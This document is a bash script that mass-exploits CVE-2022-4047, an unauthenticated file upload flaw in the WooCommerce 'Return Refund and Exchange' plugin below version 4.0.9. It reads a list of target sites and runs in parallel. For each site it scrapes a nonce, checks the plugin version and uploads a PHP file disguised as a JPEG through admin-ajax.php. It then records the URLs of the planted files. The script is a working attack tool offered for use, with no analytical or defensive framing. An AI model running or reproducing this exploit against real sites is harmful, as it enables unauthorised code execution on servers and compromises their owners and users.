#!/bin/bash
# CVE-2022-4047 - Return Refund and Exchange For WooCommerce < 4.0.9 - Unauthenticated Arbitrary File Upload
# Created By Im-Hanzou
# Using GNU Parallel
# Usage Linux or WSL: 'bash woorefer.sh list.txt thread'
# Usage for GitBash: 'TMPDIR=/tmp bash woorefer.sh list.txt thread'

yellow='\033[1;33m'
classic='\033[0m'
cyan='\033[1;36m'

banner=$(cat << "EOF"
                  (                      
 (  (             )\ )    (              
 )\))(   '       (()/(  ( )\ )   (  (    
((_)()\ ) (    (  /(_))))(()/(  ))\ )(   
_(())\_)())\   )\(_)) /((_)(_))/((_|()\  
\ \((_)/ ((_) ((_) _ (_))(_) _(_))  ((_) 
 \ \/\/ / _ \/ _ \   / -_)|  _/ -_)| '_| 
  \_/\_/\___/\___/_|_\___||_| \___||_|   
                                         
EOF
)

printf "${cyan}$banner${classic}\n"
printf "  ${yellow}CVE-2022-4047 Mass PHP File Upload${classic}\n\n"
printf "  Created By ${yellow}Im-Hanzou${classic}\n"
printf "  Github: ${yellow}im-hanzou${classic}\n\n"

touch vuln.txt notvuln.txt uploaded.txt

exploit() {
    red='\033[1;31m'
    green='\033[1;32m'
    classic='\033[0m'
    target=$1
    if [[ ! $target =~ ^https?:// ]]; then
        target="https://$target" 
    fi 
    thread=$2
    vuln="4.0.9"

    nonce=$(curl -s -k $target |  awk -F'":"' '/wps_rma_nonce/{print $3}' | cut -d '"' -f 1 | sed -n '2p')
    version=$(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-content/plugins/woo-refund-and-exchange-lite/readme.txt" | awk '/Stable tag: / {print $3}')
    prefix=$(head /dev/urandom | tr -dc '0-9' | head -c 6)
    if [ -n "$version" ]; then
        if [[ $version == $vuln || $version < $vuln ]]; then
            if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=wps_rma_return_upload_files&security_check=$nonce" -F "wps_rma_return_request_order=$prefix" -F 'wps_rma_return_request_files[]=@tifa.phtml;type=image/jpeg') =~ 'success' ]]; then
                printf "${green}[ Vuln! Uploaded | Filename: $prefix-tifa.phtml ]${classic} => [ $target ]\n";
                echo "$target" >> vuln.txt
                echo "$target/wp-content/attachment/${prefix}-tifa.phtml" >> uploaded.txt
            else
                printf "${red}[ Not Uploaded | WAF Detected! ]${classic} => $target\n";
                echo "$target" >> notvuln.txt
            fi
        else
            printf "${red}[ Version Not Vuln! ]${classic} => $target\n";
            echo "$target" >> notvuln.txt
        fi
    else
        printf "${red}[ Not WooCommerce Refund and Exchange! ]${classic} => $target\n";
        echo "$target" >> notvuln.txt
    fi
    }

export -f exploit
parallel -j $2 exploit :::: $1

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "${yellow}Total Vuln : $total\n"
printf "Total Not Vuln : $totalb${classic}\n"
